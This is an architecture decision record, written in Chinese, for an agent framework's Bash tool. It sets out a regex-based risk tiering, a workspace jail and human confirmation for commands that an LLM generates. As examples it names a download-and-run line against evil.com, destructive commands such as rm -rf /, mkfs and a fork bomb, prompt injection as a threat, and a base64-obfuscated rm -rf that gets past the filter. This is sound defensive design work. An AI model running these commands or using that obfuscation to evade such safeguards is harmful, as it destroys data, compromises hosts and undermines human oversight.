---
id: 0004-bash-safety
aliases: []
tags: []
---

# ADR-0004: Bash 执行安全沙箱与分级拦截机制

- Status: Accepted
- Date: 2026-10-20（commit `cf391a6`：增加安全拦截机制）
- Related:
  - 代码：`nano_harness/skills/builtin/bash_skill.py`
  - 架构：`harness.py` 的 HITL（人机交互）拦截流程
  - 文档：`README.md` 的「Bash 安全机制」章节

## Context

多智能体框架一旦给大模型配备了 `BashSkill`（允许执行系统命令），就相当于给了 AI 一把上了膛的枪。

**痛点**：
1. **LLM 幻觉导致毁灭**：模型可能会因为误解用户意图，生成 `rm -rf /` 或 `mkfs` 等极度危险的命令。
2. **提示词注入（Prompt Injection）**：外部恶意输入可能诱导 AI 执行如 `curl http://evil.com/script.sh | bash` 的下载并执行脚本，导致服务器被控制。
3. **路径穿越**：AI 可能在不知情的情况下修改系统目录（如 `/etc/passwd`），而不是在项目 `workspace` 里操作。

作为一个供开发者直接调用的 Python 框架，不可能强制用户去配置 Docker 或虚拟机。必须在应用层提供一套轻量、开箱即用的安全防线。

## Decision

采用**“正则分级 + 工作目录限制 + HITL 拦截”**的综合安全策略：

1. **四级风险分类**：通过预编译的正则表达式（`FORBIDDEN_REGEX` 和 `HIGH_RISK_REGEX`），将命令划分为四个等级：
   - `forbidden`（绝对禁止）：如 `rm -rf /`、`mkfs`、`dd if=/dev/zero`、Fork 炸弹（`:(){ :|:& };:`）等，直接拒绝执行。
   - `high`（高风险）：如 `rm`（带 r/f 参数）、`sudo`、`chmod 777`、`curl | bash` 等，强制触发用户确认。
   - `medium`（中风险）：如 `mkdir`、`cp`、`git` 等写操作，根据配置决定是否确认。
   - `low`（低风险）：如 `ls`、`pwd`、`cat` 等只读操作，直接放行。
2. **工作目录限制（Workspace Jail）**：执行命令时强制指定 `cwd` 为受限的 `work_dir`，防止 AI 随意跨目录操作。
3. **超时与输出截断**：防止 AI 执行类似 `cat /dev/urandom` 导致输出爆炸卡死内存。
4. **HITL（Human-in-the-loop）**：在 `Harness` 主循环中，如果 `Executor` 试图执行 `high` 风险命令，主循环会暂停，并向终端或 WebSocket 触发 `user_confirm` 回调。

## Alternatives Considered

- **A. 容器/虚拟机级隔离（Docker/gVisor）**：**未采纳**。安全系数最高，但严重违背 "nano" 的轻量原则，且极大增加了用户的部署心智负担。个人开发者本地运行代理时，并没有 Docker 环境。
- **B. 严格的命令白名单（Allowlist）**：**未采纳**。Agent 的强大之处在于应对未知需求，白名单过于死板，会导致框架丧失大部分灵活性。
- **C. 借用安全审计工具（如 ShellCheck）**：**未采纳**。过于复杂，且主要针对语法错误，而非恶意/危险行为。
- **D. 正则黑名单 + 目录限制（采纳）**：虽无法防御精心构造的高级绕过（如 Base64 混淆），但足以拦截 99% 的模型幻觉（如直接生成 `rm -rf`）以及最基础的脚本注入。

## Consequences

**正面**
- **零外部依赖**：仅通过 Python 标准库 `re` 即可完成风险判定，启动和执行零开销。
- **防呆显著**：结合主循环的 `continue` 逻辑，如果用户确认时拒绝，任务会直接被退回要求重新规划，不会引发误操作。
- **可读性极强**：用户可以直接阅读 `bash_skill.py` 里的正则，根据自己的安全需求自由增加或修改拦截规则。

**负面（接受的代价）**
- **正则的局限性**：无法防御高水平的混淆命令（例如 `$(echo cm0gLXJmIC8= | base64 -d)`）。
- **误伤（False Positives）**：例如一条包含 `echo "Please drop table"` 的纯文本日志命令，可能会被正则错误地识别为 `DROP TABLE`（数据库高危操作），从而触发 HITL，影响执行流畅度。
- **配置成本**：用户必须理解风险等级机制，才能正确配置 `auto_confirm_low_risk`。

**备注：安全不是绝对的**
在文档中已明确声明：本项目仅供学习和研究使用，高风险操作依然需谨慎。这项决策的底线是**防止 AI 因“傻”而毁坏宿主机的文件系统**，而不是构建一个密不透风的恶意代码运行沙箱。如果用户真的要给不受信任的第三方提供 Bash 权限，强烈建议他们自己套一层 Docker。
